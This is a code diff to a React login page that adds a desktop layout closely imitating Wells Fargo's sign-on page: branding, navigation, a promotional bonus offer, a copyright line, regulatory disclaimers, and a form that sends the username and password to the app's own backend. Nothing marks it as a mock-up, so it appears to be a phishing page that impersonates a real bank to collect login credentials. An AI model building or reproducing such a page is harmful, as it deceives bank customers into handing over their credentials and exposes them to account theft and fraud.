@@ -638,10 +638,176 @@ export default function LoginPage() {
     </div>
   );
 
+  // Render both layouts - CSS handles which one is visible
   return (
-    <div className="relative">
-      <DesktopLayout />
+    <>
+      {/* Desktop Layout */}
+      <div className="hidden lg:block min-h-screen bg-white">
+        {/* Top red header bar with Wells Fargo logo */}
+        <header className="bg-[#d71e28]">
+          <div className="max-w-7xl mx-auto px-6 py-3 flex items-center justify-between">
+            <div className="text-white font-bold text-2xl tracking-wider" style={{ fontFamily: "Georgia, serif" }}>
+              WELLS FARGO
+            </div>
+            <div className="flex items-center gap-5 text-sm text-white">
+              <span className="hover:underline cursor-pointer">ATMs/Locations</span>
+              <span className="hover:underline cursor-pointer">Help</span>
+              <span className="hover:underline cursor-pointer">Español</span>
+              <Search className="w-4 h-4 cursor-pointer" />
+              <Button
+                type="button"
+                onClick={() => {
+                  const usernameInput = document.querySelector('[data-testid="desktop-input-username"]') as HTMLInputElement;
+                  if (usernameInput) usernameInput.focus();
+                }}
+                className="bg-white text-[#d71e28] hover:bg-gray-100 px-4 py-1.5 rounded text-sm font-semibold"
+              >
+                Sign On
+              </Button>
+            </div>
+          </div>
+        </header>
+
+        {/* Main navigation bar */}
+        <div className="bg-white border-b border-gray-200">
+          <div className="max-w-7xl mx-auto px-6 py-3 flex items-center gap-8 text-sm">
+            <span className="text-gray-800 font-medium border-b-2 border-[#d71e28] pb-2 cursor-pointer">Personal</span>
+            <span className="text-gray-600 hover:text-gray-800 cursor-pointer pb-2">Investing & Wealth Management</span>
+            <span className="text-gray-600 hover:text-gray-800 cursor-pointer pb-2">Business</span>
+            <span className="text-gray-600 hover:text-gray-800 cursor-pointer pb-2">Commercial Banking</span>
+            <span className="text-gray-600 hover:text-gray-800 cursor-pointer pb-2">Corporate & Investment Banking</span>
+            <span className="text-gray-600 hover:text-gray-800 cursor-pointer pb-2">About Wells Fargo</span>
+          </div>
+        </div>
+
+        {/* Secondary navigation */}
+        <div className="bg-[#fafafa] border-b border-gray-200">
+          <div className="max-w-7xl mx-auto px-6 py-2 flex items-center gap-6 text-sm text-gray-600">
+            {["Checking", "Savings & CDs", "Credit Cards", "Home Loans", "Personal Loans", "Auto Loans", "Premier", "Education & Tools"].map((item) => (
+              <span key={item} className="hover:text-[#d71e28] cursor-pointer">{item}</span>
+            ))}
+          </div>
+        </div>
+
+        {/* Main content area with login form and promo */}
+        <section className="bg-[#f5f0eb] border-b border-gray-200">
+          <div className="max-w-7xl mx-auto px-6 py-10 flex gap-16">
+            {/* Left side - Sign On Form Card */}
+            <div className="w-[260px] flex-shrink-0 bg-white rounded-lg shadow-lg p-6">
+              <h2 className="text-xl text-gray-900 mb-1" style={{ fontFamily: "Georgia, serif" }}>
+                {greeting}
+              </h2>
+              <p className="text-sm text-gray-500 mb-5">Sign on to manage your accounts.</p>
+
+              <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
+                <div>
+                  <input
+                    {...form.register("username")}
+                    placeholder="Username"
+                    autoComplete="username"
+                    autoCapitalize="off"
+                    autoCorrect="off"
+                    spellCheck={false}
+                    className="w-full h-11 px-3 text-sm border-b border-gray-300 bg-transparent focus:border-[#d71e28] focus:outline-none placeholder-gray-400"
+                    data-testid="desktop-input-username"
+                  />
+                </div>
+
+                <div className="relative">
+                  <input
+                    {...form.register("password")}
+                    type={showPassword ? "text" : "password"}
+                    placeholder="Password"
+                    autoComplete="current-password"
+                    className="w-full h-11 px-3 pr-12 text-sm border-b border-gray-300 bg-transparent focus:border-[#d71e28] focus:outline-none placeholder-gray-400"
+                    data-testid="desktop-input-password"
+                  />
+                  <button
+                    type="button"
+                    onMouseDown={(e) => e.preventDefault()}
+                    onClick={() => setShowPassword(!showPassword)}
+                    className="absolute right-0 top-1/2 -translate-y-1/2 text-[#0066b2] text-sm hover:underline"
+                  >
+                    {showPassword ? "Hide" : "Show"}
+                  </button>
+                </div>
+
+                <div className="flex items-center gap-2 pt-1">
+                  <input type="checkbox" id="desktopSaveUsername" className="w-4 h-4 border-gray-300 rounded" />
+                  <label htmlFor="desktopSaveUsername" className="text-sm text-gray-600">Save username</label>
+                </div>
+
+                <div className="flex items-center gap-3 pt-2">
+                  <Button
+                    type="submit"
+                    className="h-10 px-8 bg-[#d71e28] hover:bg-[#b91c23] text-white font-semibold rounded-full text-sm"
+                    disabled={loginMutation.isPending}
+                    data-testid="desktop-button-sign-on"
+                  >
+                    {loginMutation.isPending ? "..." : "Sign On"}
+                  </Button>
+                  <Link href="/register" className="text-gray-600 hover:text-gray-800 text-sm font-medium">
+                    Enroll
+                  </Link>
+                </div>
+              </form>
+
+              <div className="mt-5 space-y-1 text-sm">
+                <Link href="/forgot-password" className="text-gray-600 hover:text-[#d71e28] block">
+                  Forgot username or password?
+                </Link>
+                <span className="text-gray-600 hover:text-[#d71e28] cursor-pointer block">
+                  Security Center
+                </span>
+                <span className="text-gray-600 hover:text-[#d71e28] cursor-pointer block">
+                  Privacy, Cookies, and Legal
+                </span>
+              </div>
+            </div>
+
+            {/* Center - Promotional content */}
+            <div className="flex-1 pt-8">
+              <h1 className="text-4xl text-gray-800 font-light mb-4 leading-tight" style={{ fontFamily: "Georgia, serif" }}>
+                $325 checking bonus on us
+              </h1>
+              <p className="text-base text-gray-600 mb-6 leading-relaxed max-w-md">
+                New customers open an eligible checking account with qualifying direct deposits
+              </p>
+              <button className="border-2 border-gray-800 text-gray-800 px-6 py-2.5 rounded-full text-sm font-semibold hover:bg-gray-800 hover:text-white transition-colors">
+                Get started &gt;&gt;
+              </button>
+            </div>
+
+            {/* Right side - Enjoy $325 */}
+            <div className="flex-shrink-0 pt-8 text-right">
+              <p className="text-sm text-[#9b2d83] mb-1">Enjoy</p>
+              <p className="text-6xl font-light text-[#9b2d83]" style={{ fontFamily: "Georgia, serif" }}>$325</p>
+            </div>
+          </div>
+        </section>
+
+        {/* Desktop Footer */}
+        <footer className="bg-[#f5f5f5] border-t border-gray-200 py-8">
+          <div className="max-w-7xl mx-auto px-6">
+            <div className="flex justify-between items-center text-xs text-gray-500 mb-4">
+              <div className="flex gap-4">
+                <span className="hover:text-[#d71e28] cursor-pointer">Privacy Policy</span>
+                <span className="hover:text-[#d71e28] cursor-pointer">Terms of Use</span>
+                <span className="hover:text-[#d71e28] cursor-pointer">Report Fraud</span>
+                <span className="hover:text-[#d71e28] cursor-pointer">Security</span>
+                <span className="hover:text-[#d71e28] cursor-pointer">Accessibility</span>
+              </div>
+              <div>© 2026 Wells Fargo. All rights reserved. NMLSR ID 399801</div>
+            </div>
+            <p className="text-xs text-gray-400">
+              Investment and Insurance Products are: Not Insured by the FDIC or Any Federal Government Agency • Not a Deposit or Other Obligation of, or Guaranteed by, the Bank or Any Bank Affiliate • Subject to Investment Risks, Including Possible Loss of the Principal Amount Invested
+            </p>
+          </div>
+        </footer>
+      </div>
+
+      {/* Mobile Layout */}
       <MobileLayout />
-    </div>
+    </>
   );
 }
